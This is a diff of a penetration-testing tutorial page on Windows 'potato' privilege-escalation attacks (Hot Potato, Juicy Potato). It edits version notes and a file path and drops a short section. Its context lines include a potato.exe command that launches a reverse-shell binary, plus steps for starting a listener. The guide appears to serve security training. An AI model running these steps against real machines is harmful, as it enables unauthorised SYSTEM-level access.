@@ -5,7 +5,7 @@
 Hot Potato is the name of an attack that uses a spoofing attack along with an NTLM relay attack to gain SYSTEM privileges. The attack tricks Windows into authenticating as the SYSTEM user to a fake HTTP server using NTLM. The NTLM credentials then get relayed to SMB in order to gain command execution. This attack works on Windows 7, 8, early versions of Windows 10, and their server counterparts.
 
 {% hint style="info" %}
-These steps are for Windows 7, windows 10 is not vulnerable.
+These steps are for Windows 7, newer versions of windows 10 is not vulnerable.
 {% endhint %}
 
 the exploit can be found here:
@@ -14,7 +14,7 @@ the exploit can be found here:
 
 and here is the compiled binary exploit:
 
-{% file src="../../../.gitbook/assets/potato.exe" %}
+{% file src="../../../../.gitbook/assets/potato.exe" %}
 
 Run the exploit with your custom reverse shell:
 
@@ -23,10 +23,6 @@ potato.exe -ip 192.168.1.33 -cmd "C:\PrivEsc\reverse.exe" - enable_httpserver tr
 ```
 
 Wait for a Windows Defender update, or trigger one manually.
-
-## Service Accounts
-
-Service accounts can be given special privileges in order for them to run their services, and cannot be logged into directly.
 
 Unfortunately, multiple problems have been found with service accounts, making them easier to escalate privileges with.
 
@@ -41,7 +37,7 @@ Rotten Potato was quite a limited exploit. Juicy Potato works in the same way as
 {% embed url="https://github.com/ohpe/juicy-potato" %}
 
 {% hint style="info" %}
-These steps are for Windows 7, windows 10 is not vulnerable
+These steps are for Windows 7, newer versions of windows 10 is not vulnerable
 {% endhint %}
 
 Copy PSExec64.exe and the JuicyPotato.exe exploit executable over to Windows and start a listener.
